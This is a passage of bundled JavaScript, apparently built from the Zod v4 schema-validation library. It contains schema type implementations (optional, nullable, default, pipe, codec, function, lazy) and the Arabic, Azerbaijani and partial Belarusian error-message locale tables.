    return { issues: [], value: undefined };
  }
  return result;
}
var $ZodOptional = /* @__PURE__ */ $constructor("$ZodOptional", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.optin = "optional";
  inst._zod.optout = "optional";
  defineLazy(inst._zod, "values", () => {
    return def.innerType._zod.values ? new Set([...def.innerType._zod.values, undefined]) : undefined;
  });
  defineLazy(inst._zod, "pattern", () => {
    const pattern = def.innerType._zod.pattern;
    return pattern ? new RegExp(`^(${cleanRegex(pattern.source)})?$`) : undefined;
  });
  inst._zod.parse = (payload, ctx) => {
    if (def.innerType._zod.optin === "optional") {
      const result = def.innerType._zod.run(payload, ctx);
      if (result instanceof Promise)
        return result.then((r) => handleOptionalResult(r, payload.value));
      return handleOptionalResult(result, payload.value);
    }
    if (payload.value === undefined) {
      return payload;
    }
    return def.innerType._zod.run(payload, ctx);
  };
});
var $ZodExactOptional = /* @__PURE__ */ $constructor("$ZodExactOptional", (inst, def) => {
  $ZodOptional.init(inst, def);
  defineLazy(inst._zod, "values", () => def.innerType._zod.values);
  defineLazy(inst._zod, "pattern", () => def.innerType._zod.pattern);
  inst._zod.parse = (payload, ctx) => {
    return def.innerType._zod.run(payload, ctx);
  };
});
var $ZodNullable = /* @__PURE__ */ $constructor("$ZodNullable", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "optin", () => def.innerType._zod.optin);
  defineLazy(inst._zod, "optout", () => def.innerType._zod.optout);
  defineLazy(inst._zod, "pattern", () => {
    const pattern = def.innerType._zod.pattern;
    return pattern ? new RegExp(`^(${cleanRegex(pattern.source)}|null)$`) : undefined;
  });
  defineLazy(inst._zod, "values", () => {
    return def.innerType._zod.values ? new Set([...def.innerType._zod.values, null]) : undefined;
  });
  inst._zod.parse = (payload, ctx) => {
    if (payload.value === null)
      return payload;
    return def.innerType._zod.run(payload, ctx);
  };
});
var $ZodDefault = /* @__PURE__ */ $constructor("$ZodDefault", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.optin = "optional";
  defineLazy(inst._zod, "values", () => def.innerType._zod.values);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    if (payload.value === undefined) {
      payload.value = def.defaultValue;
      return payload;
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => handleDefaultResult(result2, def));
    }
    return handleDefaultResult(result, def);
  };
});
function handleDefaultResult(payload, def) {
  if (payload.value === undefined) {
    payload.value = def.defaultValue;
  }
  return payload;
}
var $ZodPrefault = /* @__PURE__ */ $constructor("$ZodPrefault", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.optin = "optional";
  defineLazy(inst._zod, "values", () => def.innerType._zod.values);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    if (payload.value === undefined) {
      payload.value = def.defaultValue;
    }
    return def.innerType._zod.run(payload, ctx);
  };
});
var $ZodNonOptional = /* @__PURE__ */ $constructor("$ZodNonOptional", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "values", () => {
    const v = def.innerType._zod.values;
    return v ? new Set([...v].filter((x) => x !== undefined)) : undefined;
  });
  inst._zod.parse = (payload, ctx) => {
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => handleNonOptionalResult(result2, inst));
    }
    return handleNonOptionalResult(result, inst);
  };
});
function handleNonOptionalResult(payload, inst) {
  if (!payload.issues.length && payload.value === undefined) {
    payload.issues.push({
      code: "invalid_type",
      expected: "nonoptional",
      input: payload.value,
      inst
    });
  }
  return payload;
}
var $ZodSuccess = /* @__PURE__ */ $constructor("$ZodSuccess", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      throw new $ZodEncodeError("ZodSuccess");
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => {
        payload.value = result2.issues.length === 0;
        return payload;
      });
    }
    payload.value = result.issues.length === 0;
    return payload;
  };
});
var $ZodCatch = /* @__PURE__ */ $constructor("$ZodCatch", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "optin", () => def.innerType._zod.optin);
  defineLazy(inst._zod, "optout", () => def.innerType._zod.optout);
  defineLazy(inst._zod, "values", () => def.innerType._zod.values);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => {
        payload.value = result2.value;
        if (result2.issues.length) {
          payload.value = def.catchValue({
            ...payload,
            error: {
              issues: result2.issues.map((iss) => finalizeIssue(iss, ctx, config()))
            },
            input: payload.value
          });
          payload.issues = [];
        }
        return payload;
      });
    }
    payload.value = result.value;
    if (result.issues.length) {
      payload.value = def.catchValue({
        ...payload,
        error: {
          issues: result.issues.map((iss) => finalizeIssue(iss, ctx, config()))
        },
        input: payload.value
      });
      payload.issues = [];
    }
    return payload;
  };
});
var $ZodNaN = /* @__PURE__ */ $constructor("$ZodNaN", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    if (typeof payload.value !== "number" || !Number.isNaN(payload.value)) {
      payload.issues.push({
        input: payload.value,
        inst,
        expected: "nan",
        code: "invalid_type"
      });
      return payload;
    }
    return payload;
  };
});
var $ZodPipe = /* @__PURE__ */ $constructor("$ZodPipe", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "values", () => def.in._zod.values);
  defineLazy(inst._zod, "optin", () => def.in._zod.optin);
  defineLazy(inst._zod, "optout", () => def.out._zod.optout);
  defineLazy(inst._zod, "propValues", () => def.in._zod.propValues);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      const right = def.out._zod.run(payload, ctx);
      if (right instanceof Promise) {
        return right.then((right2) => handlePipeResult(right2, def.in, ctx));
      }
      return handlePipeResult(right, def.in, ctx);
    }
    const left = def.in._zod.run(payload, ctx);
    if (left instanceof Promise) {
      return left.then((left2) => handlePipeResult(left2, def.out, ctx));
    }
    return handlePipeResult(left, def.out, ctx);
  };
});
function handlePipeResult(left, next, ctx) {
  if (left.issues.length) {
    left.aborted = true;
    return left;
  }
  return next._zod.run({ value: left.value, issues: left.issues }, ctx);
}
var $ZodCodec = /* @__PURE__ */ $constructor("$ZodCodec", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "values", () => def.in._zod.values);
  defineLazy(inst._zod, "optin", () => def.in._zod.optin);
  defineLazy(inst._zod, "optout", () => def.out._zod.optout);
  defineLazy(inst._zod, "propValues", () => def.in._zod.propValues);
  inst._zod.parse = (payload, ctx) => {
    const direction = ctx.direction || "forward";
    if (direction === "forward") {
      const left = def.in._zod.run(payload, ctx);
      if (left instanceof Promise) {
        return left.then((left2) => handleCodecAResult(left2, def, ctx));
      }
      return handleCodecAResult(left, def, ctx);
    } else {
      const right = def.out._zod.run(payload, ctx);
      if (right instanceof Promise) {
        return right.then((right2) => handleCodecAResult(right2, def, ctx));
      }
      return handleCodecAResult(right, def, ctx);
    }
  };
});
function handleCodecAResult(result, def, ctx) {
  if (result.issues.length) {
    result.aborted = true;
    return result;
  }
  const direction = ctx.direction || "forward";
  if (direction === "forward") {
    const transformed = def.transform(result.value, result);
    if (transformed instanceof Promise) {
      return transformed.then((value) => handleCodecTxResult(result, value, def.out, ctx));
    }
    return handleCodecTxResult(result, transformed, def.out, ctx);
  } else {
    const transformed = def.reverseTransform(result.value, result);
    if (transformed instanceof Promise) {
      return transformed.then((value) => handleCodecTxResult(result, value, def.in, ctx));
    }
    return handleCodecTxResult(result, transformed, def.in, ctx);
  }
}
function handleCodecTxResult(left, value, nextSchema, ctx) {
  if (left.issues.length) {
    left.aborted = true;
    return left;
  }
  return nextSchema._zod.run({ value, issues: left.issues }, ctx);
}
var $ZodReadonly = /* @__PURE__ */ $constructor("$ZodReadonly", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "propValues", () => def.innerType._zod.propValues);
  defineLazy(inst._zod, "values", () => def.innerType._zod.values);
  defineLazy(inst._zod, "optin", () => def.innerType?._zod?.optin);
  defineLazy(inst._zod, "optout", () => def.innerType?._zod?.optout);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then(handleReadonlyResult);
    }
    return handleReadonlyResult(result);
  };
});
function handleReadonlyResult(payload) {
  payload.value = Object.freeze(payload.value);
  return payload;
}
var $ZodTemplateLiteral = /* @__PURE__ */ $constructor("$ZodTemplateLiteral", (inst, def) => {
  $ZodType.init(inst, def);
  const regexParts = [];
  for (const part of def.parts) {
    if (typeof part === "object" && part !== null) {
      if (!part._zod.pattern) {
        throw new Error(`Invalid template literal part, no pattern found: ${[...part._zod.traits].shift()}`);
      }
      const source = part._zod.pattern instanceof RegExp ? part._zod.pattern.source : part._zod.pattern;
      if (!source)
        throw new Error(`Invalid template literal part: ${part._zod.traits}`);
      const start = source.startsWith("^") ? 1 : 0;
      const end = source.endsWith("$") ? source.length - 1 : source.length;
      regexParts.push(source.slice(start, end));
    } else if (part === null || primitiveTypes.has(typeof part)) {
      regexParts.push(escapeRegex(`${part}`));
    } else {
      throw new Error(`Invalid template literal part: ${part}`);
    }
  }
  inst._zod.pattern = new RegExp(`^${regexParts.join("")}$`);
  inst._zod.parse = (payload, _ctx) => {
    if (typeof payload.value !== "string") {
      payload.issues.push({
        input: payload.value,
        inst,
        expected: "string",
        code: "invalid_type"
      });
      return payload;
    }
    inst._zod.pattern.lastIndex = 0;
    if (!inst._zod.pattern.test(payload.value)) {
      payload.issues.push({
        input: payload.value,
        inst,
        code: "invalid_format",
        format: def.format ?? "template_literal",
        pattern: inst._zod.pattern.source
      });
      return payload;
    }
    return payload;
  };
});
var $ZodFunction = /* @__PURE__ */ $constructor("$ZodFunction", (inst, def) => {
  $ZodType.init(inst, def);
  inst._def = def;
  inst._zod.def = def;
  inst.implement = (func) => {
    if (typeof func !== "function") {
      throw new Error("implement() must be called with a function");
    }
    return function(...args) {
      const parsedArgs = inst._def.input ? parse(inst._def.input, args) : args;
      const result = Reflect.apply(func, this, parsedArgs);
      if (inst._def.output) {
        return parse(inst._def.output, result);
      }
      return result;
    };
  };
  inst.implementAsync = (func) => {
    if (typeof func !== "function") {
      throw new Error("implementAsync() must be called with a function");
    }
    return async function(...args) {
      const parsedArgs = inst._def.input ? await parseAsync(inst._def.input, args) : args;
      const result = await Reflect.apply(func, this, parsedArgs);
      if (inst._def.output) {
        return await parseAsync(inst._def.output, result);
      }
      return result;
    };
  };
  inst._zod.parse = (payload, _ctx) => {
    if (typeof payload.value !== "function") {
      payload.issues.push({
        code: "invalid_type",
        expected: "function",
        input: payload.value,
        inst
      });
      return payload;
    }
    const hasPromiseOutput = inst._def.output && inst._def.output._zod.def.type === "promise";
    if (hasPromiseOutput) {
      payload.value = inst.implementAsync(payload.value);
    } else {
      payload.value = inst.implement(payload.value);
    }
    return payload;
  };
  inst.input = (...args) => {
    const F = inst.constructor;
    if (Array.isArray(args[0])) {
      return new F({
        type: "function",
        input: new $ZodTuple({
          type: "tuple",
          items: args[0],
          rest: args[1]
        }),
        output: inst._def.output
      });
    }
    return new F({
      type: "function",
      input: args[0],
      output: inst._def.output
    });
  };
  inst.output = (output) => {
    const F = inst.constructor;
    return new F({
      type: "function",
      input: inst._def.input,
      output
    });
  };
  return inst;
});
var $ZodPromise = /* @__PURE__ */ $constructor("$ZodPromise", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    return Promise.resolve(payload.value).then((inner) => def.innerType._zod.run({ value: inner, issues: [] }, ctx));
  };
});
var $ZodLazy = /* @__PURE__ */ $constructor("$ZodLazy", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "innerType", () => def.getter());
  defineLazy(inst._zod, "pattern", () => inst._zod.innerType?._zod?.pattern);
  defineLazy(inst._zod, "propValues", () => inst._zod.innerType?._zod?.propValues);
  defineLazy(inst._zod, "optin", () => inst._zod.innerType?._zod?.optin ?? undefined);
  defineLazy(inst._zod, "optout", () => inst._zod.innerType?._zod?.optout ?? undefined);
  inst._zod.parse = (payload, ctx) => {
    const inner = inst._zod.innerType;
    return inner._zod.run(payload, ctx);
  };
});
var $ZodCustom = /* @__PURE__ */ $constructor("$ZodCustom", (inst, def) => {
  $ZodCheck.init(inst, def);
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, _) => {
    return payload;
  };
  inst._zod.check = (payload) => {
    const input = payload.value;
    const r = def.fn(input);
    if (r instanceof Promise) {
      return r.then((r2) => handleRefineResult(r2, payload, input, inst));
    }
    handleRefineResult(r, payload, input, inst);
    return;
  };
});
function handleRefineResult(result, payload, input, inst) {
  if (!result) {
    const _iss = {
      code: "custom",
      input,
      inst,
      path: [...inst._zod.def.path ?? []],
      continue: !inst._zod.def.abort
    };
    if (inst._zod.def.params)
      _iss.params = inst._zod.def.params;
    payload.issues.push(issue(_iss));
  }
}
// node_modules/zod/v4/locales/index.js
var exports_locales = {};
__export(exports_locales, {
  zhTW: () => zh_TW_default,
  zhCN: () => zh_CN_default,
  yo: () => yo_default,
  vi: () => vi_default,
  uz: () => uz_default,
  ur: () => ur_default,
  uk: () => uk_default,
  ua: () => ua_default,
  tr: () => tr_default,
  th: () => th_default,
  ta: () => ta_default,
  sv: () => sv_default,
  sl: () => sl_default,
  ru: () => ru_default,
  pt: () => pt_default,
  ps: () => ps_default,
  pl: () => pl_default,
  ota: () => ota_default,
  no: () => no_default,
  nl: () => nl_default,
  ms: () => ms_default,
  mk: () => mk_default,
  lt: () => lt_default,
  ko: () => ko_default,
  km: () => km_default,
  kh: () => kh_default,
  ka: () => ka_default,
  ja: () => ja_default,
  it: () => it_default,
  is: () => is_default,
  id: () => id_default,
  hy: () => hy_default,
  hu: () => hu_default,
  he: () => he_default,
  frCA: () => fr_CA_default,
  fr: () => fr_default,
  fi: () => fi_default,
  fa: () => fa_default,
  es: () => es_default,
  eo: () => eo_default,
  en: () => en_default,
  de: () => de_default,
  da: () => da_default,
  cs: () => cs_default,
  ca: () => ca_default,
  bg: () => bg_default,
  be: () => be_default,
  az: () => az_default,
  ar: () => ar_default
});

// node_modules/zod/v4/locales/ar.js
var error = () => {
  const Sizable = {
    string: { unit: "\u062D\u0631\u0641", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" },
    file: { unit: "\u0628\u0627\u064A\u062A", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" },
    array: { unit: "\u0639\u0646\u0635\u0631", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" },
    set: { unit: "\u0639\u0646\u0635\u0631", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0645\u062F\u062E\u0644",
    email: "\u0628\u0631\u064A\u062F \u0625\u0644\u0643\u062A\u0631\u0648\u0646\u064A",
    url: "\u0631\u0627\u0628\u0637",
    emoji: "\u0625\u064A\u0645\u0648\u062C\u064A",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u062A\u0627\u0631\u064A\u062E \u0648\u0648\u0642\u062A \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    date: "\u062A\u0627\u0631\u064A\u062E \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    time: "\u0648\u0642\u062A \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    duration: "\u0645\u062F\u0629 \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    ipv4: "\u0639\u0646\u0648\u0627\u0646 IPv4",
    ipv6: "\u0639\u0646\u0648\u0627\u0646 IPv6",
    cidrv4: "\u0645\u062F\u0649 \u0639\u0646\u0627\u0648\u064A\u0646 \u0628\u0635\u064A\u063A\u0629 IPv4",
    cidrv6: "\u0645\u062F\u0649 \u0639\u0646\u0627\u0648\u064A\u0646 \u0628\u0635\u064A\u063A\u0629 IPv6",
    base64: "\u0646\u064E\u0635 \u0628\u062A\u0631\u0645\u064A\u0632 base64-encoded",
    base64url: "\u0646\u064E\u0635 \u0628\u062A\u0631\u0645\u064A\u0632 base64url-encoded",
    json_string: "\u0646\u064E\u0635 \u0639\u0644\u0649 \u0647\u064A\u0626\u0629 JSON",
    e164: "\u0631\u0642\u0645 \u0647\u0627\u062A\u0641 \u0628\u0645\u0639\u064A\u0627\u0631 E.164",
    jwt: "JWT",
    template_literal: "\u0645\u062F\u062E\u0644"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u0645\u062F\u062E\u0644\u0627\u062A \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644\u0629: \u064A\u0641\u062A\u0631\u0636 \u0625\u062F\u062E\u0627\u0644 instanceof ${issue2.expected}\u060C \u0648\u0644\u0643\u0646 \u062A\u0645 \u0625\u062F\u062E\u0627\u0644 ${received}`;
        }
        return `\u0645\u062F\u062E\u0644\u0627\u062A \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644\u0629: \u064A\u0641\u062A\u0631\u0636 \u0625\u062F\u062E\u0627\u0644 ${expected}\u060C \u0648\u0644\u0643\u0646 \u062A\u0645 \u0625\u062F\u062E\u0627\u0644 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u0645\u062F\u062E\u0644\u0627\u062A \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644\u0629: \u064A\u0641\u062A\u0631\u0636 \u0625\u062F\u062E\u0627\u0644 ${stringifyPrimitive(issue2.values[0])}`;
        return `\u0627\u062E\u062A\u064A\u0627\u0631 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062A\u0648\u0642\u0639 \u0627\u0646\u062A\u0642\u0627\u0621 \u0623\u062D\u062F \u0647\u0630\u0647 \u0627\u0644\u062E\u064A\u0627\u0631\u0627\u062A: ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return ` \u0623\u0643\u0628\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0623\u0646 \u062A\u0643\u0648\u0646 ${issue2.origin ?? "\u0627\u0644\u0642\u064A\u0645\u0629"} ${adj} ${issue2.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0635\u0631"}`;
        return `\u0623\u0643\u0628\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0623\u0646 \u062A\u0643\u0648\u0646 ${issue2.origin ?? "\u0627\u0644\u0642\u064A\u0645\u0629"} ${adj} ${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0623\u0635\u063A\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0644\u0640 ${issue2.origin} \u0623\u0646 \u064A\u0643\u0648\u0646 ${adj} ${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u0623\u0635\u063A\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0644\u0640 ${issue2.origin} \u0623\u0646 \u064A\u0643\u0648\u0646 ${adj} ${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0628\u062F\u0623 \u0628\u0640 "${issue2.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0646\u062A\u0647\u064A \u0628\u0640 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u062A\u0636\u0645\u0651\u064E\u0646 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0637\u0627\u0628\u0642 \u0627\u0644\u0646\u0645\u0637 ${_issue.pattern}`;
        return `${FormatDictionary[_issue.format] ?? issue2.format} \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644`;
      }
      case "not_multiple_of":
        return `\u0631\u0642\u0645 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0643\u0648\u0646 \u0645\u0646 \u0645\u0636\u0627\u0639\u0641\u0627\u062A ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\u0645\u0639\u0631\u0641${issue2.keys.length > 1 ? "\u0627\u062A" : ""} \u063A\u0631\u064A\u0628${issue2.keys.length > 1 ? "\u0629" : ""}: ${joinValues(issue2.keys, "\u060C ")}`;
      case "invalid_key":
        return `\u0645\u0639\u0631\u0641 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644 \u0641\u064A ${issue2.origin}`;
      case "invalid_union":
        return "\u0645\u062F\u062E\u0644 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644";
      case "invalid_element":
        return `\u0645\u062F\u062E\u0644 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644 \u0641\u064A ${issue2.origin}`;
      default:
        return "\u0645\u062F\u062E\u0644 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644";
    }
  };
};
function ar_default() {
  return {
    localeError: error()
  };
}
// node_modules/zod/v4/locales/az.js
var error2 = () => {
  const Sizable = {
    string: { unit: "simvol", verb: "olmal\u0131d\u0131r" },
    file: { unit: "bayt", verb: "olmal\u0131d\u0131r" },
    array: { unit: "element", verb: "olmal\u0131d\u0131r" },
    set: { unit: "element", verb: "olmal\u0131d\u0131r" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "input",
    email: "email address",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datetime",
    date: "ISO date",
    time: "ISO time",
    duration: "ISO duration",
    ipv4: "IPv4 address",
    ipv6: "IPv6 address",
    cidrv4: "IPv4 range",
    cidrv6: "IPv6 range",
    base64: "base64-encoded string",
    base64url: "base64url-encoded string",
    json_string: "JSON string",
    e164: "E.164 number",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Yanl\u0131\u015F d\u0259y\u0259r: g\xF6zl\u0259nil\u0259n instanceof ${issue2.expected}, daxil olan ${received}`;
        }
        return `Yanl\u0131\u015F d\u0259y\u0259r: g\xF6zl\u0259nil\u0259n ${expected}, daxil olan ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Yanl\u0131\u015F d\u0259y\u0259r: g\xF6zl\u0259nil\u0259n ${stringifyPrimitive(issue2.values[0])}`;
        return `Yanl\u0131\u015F se\xE7im: a\u015Fa\u011F\u0131dak\u0131lardan biri olmal\u0131d\u0131r: ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\xC7ox b\xF6y\xFCk: g\xF6zl\u0259nil\u0259n ${issue2.origin ?? "d\u0259y\u0259r"} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "element"}`;
        return `\xC7ox b\xF6y\xFCk: g\xF6zl\u0259nil\u0259n ${issue2.origin ?? "d\u0259y\u0259r"} ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\xC7ox ki\xE7ik: g\xF6zl\u0259nil\u0259n ${issue2.origin} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        return `\xC7ox ki\xE7ik: g\xF6zl\u0259nil\u0259n ${issue2.origin} ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Yanl\u0131\u015F m\u0259tn: "${_issue.prefix}" il\u0259 ba\u015Flamal\u0131d\u0131r`;
        if (_issue.format === "ends_with")
          return `Yanl\u0131\u015F m\u0259tn: "${_issue.suffix}" il\u0259 bitm\u0259lidir`;
        if (_issue.format === "includes")
          return `Yanl\u0131\u015F m\u0259tn: "${_issue.includes}" daxil olmal\u0131d\u0131r`;
        if (_issue.format === "regex")
          return `Yanl\u0131\u015F m\u0259tn: ${_issue.pattern} \u015Fablonuna uy\u011Fun olmal\u0131d\u0131r`;
        return `Yanl\u0131\u015F ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Yanl\u0131\u015F \u0259d\u0259d: ${issue2.divisor} il\u0259 b\xF6l\xFCn\u0259 bil\u0259n olmal\u0131d\u0131r`;
      case "unrecognized_keys":
        return `Tan\u0131nmayan a\xE7ar${issue2.keys.length > 1 ? "lar" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `${issue2.origin} daxilind\u0259 yanl\u0131\u015F a\xE7ar`;
      case "invalid_union":
        return "Yanl\u0131\u015F d\u0259y\u0259r";
      case "invalid_element":
        return `${issue2.origin} daxilind\u0259 yanl\u0131\u015F d\u0259y\u0259r`;
      default:
        return `Yanl\u0131\u015F d\u0259y\u0259r`;
    }
  };
};
function az_default() {
  return {
    localeError: error2()
  };
}
// node_modules/zod/v4/locales/be.js
function getBelarusianPlural(count, one, few, many) {
  const absCount = Math.abs(count);
  const lastDigit = absCount % 10;
  const lastTwoDigits = absCount % 100;
  if (lastTwoDigits >= 11 && lastTwoDigits <= 19) {
    return many;
  }
  if (lastDigit === 1) {
    return one;
  }
  if (lastDigit >= 2 && lastDigit <= 4) {
    return few;
  }
  return many;
}
var error3 = () => {
  const Sizable = {
    string: {
      unit: {
        one: "\u0441\u0456\u043C\u0432\u0430\u043B",
        few: "\u0441\u0456\u043C\u0432\u0430\u043B\u044B",
        many: "\u0441\u0456\u043C\u0432\u0430\u043B\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    },
    array: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u044B",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    },
    set: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u044B",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    },
    file: {
      unit: {
        one: "\u0431\u0430\u0439\u0442",
        few: "\u0431\u0430\u0439\u0442\u044B",
        many: "\u0431\u0430\u0439\u0442\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0443\u0432\u043E\u0434",
    email: "email \u0430\u0434\u0440\u0430\u0441",
    url: "URL",
    emoji: "\u044D\u043C\u043E\u0434\u0437\u0456",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0434\u0430\u0442\u0430 \u0456 \u0447\u0430\u0441",
    date: "ISO \u0434\u0430\u0442\u0430",
    time: "ISO \u0447\u0430\u0441",
    duration: "ISO \u043F\u0440\u0430\u0446\u044F\u0433\u043B\u0430\u0441\u0446\u044C",
    ipv4: "IPv4 \u0430\u0434\u0440\u0430\u0441",
    ipv6: "IPv6 \u0430\u0434\u0440\u0430\u0441",
    cidrv4: "IPv4 \u0434\u044B\u044F\u043F\u0430\u0437\u043E\u043D",
